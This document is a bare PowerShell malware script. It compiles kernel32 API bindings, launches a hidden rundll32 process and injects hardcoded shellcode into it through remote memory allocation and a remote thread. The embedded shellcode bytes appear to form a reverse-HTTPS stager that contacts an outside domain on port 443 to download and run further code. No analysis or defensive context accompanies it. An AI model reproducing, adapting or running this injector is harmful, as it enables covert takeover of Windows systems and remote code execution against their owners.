
function CleanInject {
$code = @"
using System;
using System.Runtime.InteropServices;
namespace k32
{
    public class func
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
        All = 0x001F0FFF,
        CreateThread = 0x00000002
        }
        [Flags]
        public enum AllocationType
        {
        Commit = 0x1000,
        Reserve = 0x2000
        }
        [Flags]
        public enum MemoryProtection
        {
        ExecuteReadWrite = 0x40,
        ReadWrite = 0x04
        }
        [Flags]
        public enum Time : uint
        { Infinite = 0xFFFFFFFF }
        [DllImport("kernel32.dll")]
        public static extern bool IsWow64Process(IntPtr hProcess, [Out] IntPtr Wow64Process);
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, [Out] IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, [Out] IntPtr lpflOldProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll")]
        public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
    }
}
"@
$codeProvider = New-Object Microsoft.CSharp.CSharpCodeProvider
$location = [PsObject].Assembly.Location
$compileParams = New-Object System.CodeDom.Compiler.CompilerParameters
$assemblyRange = @("System.dll", $location)
$compileParams.ReferencedAssemblies.AddRange($assemblyRange)
$compileParams.GenerateInMemory = $True
$output = $codeProvider.CompileAssemblyFromSource($compileParams, $code)
function Inject-Shellcode-Into-Remote-Proc([Int] $id)
    {
        $procHandle = [k32.func]::OpenProcess([k32.func+ProcessAccessFlags]::All, 0, $id)
        if ([Bool]!$procHandle) { $global:result = 2; return }
        [Byte[]]$wow64 = 0xFF
        if ((Get-WmiObject Win32_Processor AddressWidth).AddressWidth -ne 32)
        {
            $wow64Ptr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($wow64,0)
            $temp = [k32.func]::IsWow64Process($procHandle, $wow64Ptr)
            if ([Bool]!$wow64 -and ([IntPtr]::Size -eq 4)) { $global:result = 9; return }
            elseif ([Bool]!$wow64){ $sc = $sc64 }
        } else { $wow64[0] = 1 }
        $baseAddr = [k32.func]::VirtualAllocEx($procHandle, 0, $sc.Length + 1, [k32.func+AllocationType]::Reserve -bOr [k32.func+AllocationType]::Commit, [k32.func+MemoryProtection]::ExecuteReadWrite)
        if ([Bool]!$baseAddr) { $global:result = 3; return }
        [Int[]] $bytesWritten = 0
        $bytesWrittenPtr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($bytesWritten,0)
        $success = [k32.func]::WriteProcessMemory($procHandle, $baseAddr, $sc, $sc.Length, $bytesWrittenPtr)
        if ([Bool]!$success) { $global:result = 4; return }
        $k32handle = [k32.func]::GetModuleHandle("kernel32.dll")
        $exitThreadAddr = [k32.func]::GetProcAddress($k32handle, "ExitThread")
        if ([Bool]!$exitThreadAddr) { $global:result = 5; return }
        [Byte[]] $exitThreadAddrLEbytes = New-Object Byte[](4)
        $i=0
        $exitThreadAddr.ToString("X8") -split '([A-F0-9]{2})' | % { if ($_) {$exitThreadAddrLEbytes[$i] = [System.Convert]::ToByte($_,16); $i++}}
        [System.Array]::Reverse($exitThreadAddrLEbytes)
        $baseAddrLEbytes = New-Object Byte[](4)
        $i=0
        $baseAddr.ToString("X8") -split '([A-F0-9]{2})' | % { if ($_) {$baseAddrLEbytes[$i] = [System.Convert]::ToByte($_,16); $i++}}
        [System.Array]::Reverse($baseAddrLEbytes)
        if ([Bool]$wow64) {
            [Byte[]] $callRemoteThread = 0xB8
            $callRemoteThread += $baseAddrLEbytes
            $callRemoteThread += 0xFF,0xD0,0x6A,0x00,0xB8
            $callRemoteThread += $exitThreadAddrLEbytes
            $callRemoteThread += 0xFF,0xD0
            $callRemoteThreadAddr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($callRemoteThread,0)
        } else {
            [Byte[]] $callRemoteThread = 0x48,0xC7,0xC0
            $callRemoteThread += $baseAddrLEbytes
            $callRemoteThread += 0xFF,0xD0,0x6A,0x00,0x48,0xC7,0xC0
            $callRemoteThread += $exitThreadAddrLEbytes
            $callRemoteThread += 0xFF,0xD0
            $callRemoteThreadAddr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($callRemoteThread,0)
        }
        $remoteStubAddr = [k32.func]::VirtualAllocEx($procHandle, 0, $callRemoteThread.Length, [k32.func+AllocationType]::Reserve -bOr [k32.func+AllocationType]::Commit, [k32.func+MemoryProtection]::ExecuteReadWrite)
        if ([Bool]!$remoteStubAddr) { $global:result = 3; return }
        [Int[]] $OldProtect = 0
        $pOldProtect = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($OldProtect,0)
        $success = [k32.func]::VirtualProtect($callRemoteThreadAddr, $callRemoteThread.Length, [k32.func+MemoryProtection]::ExecuteReadWrite, $pOldProtect)
        if ([Bool]!$success) { $global:result = 6; return }
        $success = [k32.func]::WriteProcessMemory($procHandle, $remoteStubAddr, $callRemoteThread, $callRemoteThread.Length, $bytesWrittenPtr)
        if ([Bool]!$success) { $global:result = 4; return }
        [IntPtr] $threadHandle = [k32.func]::CreateRemoteThread($procHandle, 0, 0, $remoteStubAddr, $baseAddr, 0, 0)
        if ([Bool]!$threadHandle) { $global:result = 7; return }
        $success = [k32.func]::CloseHandle($procHandle)
        if ([Bool]!$success) { $global:result = 8; return }
        $global:result = 1
        return
    }
[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xe8,0x80,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x57,0x4f,0x57,0x36,0x34,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x00,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x00,0x59,0x31,0xff,0x57,0x57,0x57,0x57,0x51,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xe9,0x93,0x00,0x00,0x00,0x5b,0x31,0xc9,0x51,0x51,0x6a,0x03,0x51,0x51,0x68,0xbb,0x01,0x00,0x00,0x53,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc3,0xeb,0x7a,0x59,0x31,0xd2,0x52,0x68,0x00,0x32,0xa0,0x84,0x52,0x52,0x52,0x51,0x52,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x89,0xc6,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x31,0xff,0x57,0x57,0x57,0x57,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x74,0x48,0x31,0xff,0x85,0xf6,0x74,0x04,0x89,0xf9,0xeb,0x09,0x68,0xaa,0xc5,0xe2,0x5d,0xff,0xd5,0x89,0xc1,0x68,0x45,0x21,0x5e,0x31,0xff,0xd5,0x31,0xff,0x57,0x6a,0x07,0x51,0x56,0x50,0x68,0xb7,0x57,0xe0,0x0b,0xff,0xd5,0xbf,0x00,0x2f,0x00,0x00,0x39,0xc7,0x75,0x04,0x89,0xd8,0xeb,0x8a,0x31,0xff,0xeb,0x15,0xeb,0x49,0xe8,0x81,0xff,0xff,0xff,0x2f,0x51,0x63,0x70,0x67,0x00,0x00,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x57,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0xe8,0x1d,0xff,0xff,0xff,0x77,0x6f,0x6d,0x65,0x6e,0x2d,0x66,0x6f,0x72,0x2d,0x68,0x69,0x6c,0x6c,0x61,0x72,0x79,0x2e,0x63,0x6f,0x6d,0x00
$ordprocs = (Get-Process -name rundll32 -ErrorAction SilentlyContinue) | Select-Object -property id | select -expand id
if ($ordprocs -eq $null){ 
	if ([System.IntPtr]::Size -eq 4) { 
		Start-Process -FilePath "C:\Windows\System32\rundll32.exe" -ArgumentList "Printui.dll PrintUIEntry" -win Hidden
		$id = (Get-Process -Name rundll32)| Select-Object -property id | select -expand id
		Inject-Shellcode-Into-Remote-Proc $id
	}
	else { 
		Start-Process -FilePath "C:\Windows\SysWOW64\rundll32.exe" -ArgumentList "Printui.dll PrintUIEntry" -win Hidden
		$id = (Get-Process -Name rundll32)| Select-Object -property id | select -expand id
		Inject-Shellcode-Into-Remote-Proc $id
	}
  }
else {
	if ([System.IntPtr]::Size -eq 4) { 
		Start-Process -FilePath "C:\Windows\System32\rundll32.exe" -ArgumentList "Printui.dll PrintUIEntry" -win Hidden
		$rdprocs = (Get-Process -Name rundll32)| Select-Object -property id | select -expand id
		$id = Compare-Object -ReferenceObject $ordprocs -DifferenceObject $rdprocs -PassThru
		Inject-Shellcode-Into-Remote-Proc $id
	} 
	else { 
		Start-Process -FilePath "C:\Windows\SysWOW64\rundll32.exe" -ArgumentList "Printui.dll PrintUIEntry" -win Hidden
		$rdprocs = (Get-Process -Name rundll32)| Select-Object -property id | select -expand id
		$id = Compare-Object -ReferenceObject $ordprocs -DifferenceObject $rdprocs -PassThru
		Inject-Shellcode-Into-Remote-Proc $id		
	}
  }
}
CleanInject

